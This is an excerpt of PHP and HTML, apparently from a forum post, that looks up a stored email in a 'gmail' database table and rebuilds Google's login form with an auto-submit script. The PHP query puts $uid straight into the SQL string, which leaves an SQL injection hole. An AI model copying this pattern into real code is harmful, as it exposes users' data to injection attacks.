...
$query = mysql_query("SELECT user_email FROM `gmail` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>

<script>function submitform()  {document.forms["gaia_loginform"].submit();}</script>
...
<form novalidate="" id="gaia_loginform" action="https://accounts.google.com/ServiceLoginAuth?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/ca/&ss=1&scc=1<mpl=default<mplcache=2" method="post">
  <input type="hidden" name="dsh" id="dsh" value="-8113941299842512123">
  <input type="hidden" name="GALX" value="VdBcHlpzdz8">
  <input type="hidden" id="pstMsg" name="pstMsg" value="1">
  <input type="hidden" id="dnConn" name="dnConn" value="">
  <input type="hidden" id="checkConnection" name="checkConnection" value="youtube:111:1">
